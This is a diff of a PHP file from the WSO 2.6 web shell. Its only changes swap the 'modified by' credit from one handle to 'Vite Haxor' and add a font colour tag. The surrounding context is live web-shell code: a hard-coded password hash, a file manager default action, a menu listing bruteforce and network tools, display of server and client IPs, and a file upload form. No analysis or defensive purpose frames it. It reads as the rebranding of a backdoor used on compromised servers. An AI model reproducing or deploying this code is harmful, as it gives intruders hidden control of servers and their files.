@@ -1,5 +1,5 @@
 <?php
-/* WSO 2.6 modified by m0bil3_xT */ 
+/* WSO 2.6 modified by Vite Haxor */ 
 $auth_pass = "a727563903d3000164c58f515fb96a52";
 $color = "white";
 $default_action = 'FilesMan';
@@ -294,7 +294,7 @@ mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Netw
 href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>'
        . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . 
 
-'</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER
+'</optgroup></select><br><span><font color=#ecf0f1>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER
 
 ['REMOTE_ADDR'] . '</nobr></td></tr></table>'
        . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
@@ -332,7 +332,7 @@ value=''><input type=submit value='>>'></form></td>
 		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
 		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
 
-	</tr></table><center>WSO 2.6 - Modified by m0bil3_xT</center></div></body></html>";
+	</tr></table><center>WSO 2.6 - Modified by Vite Haxor</center></div></font></body></html>";
 }
 
 if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) {
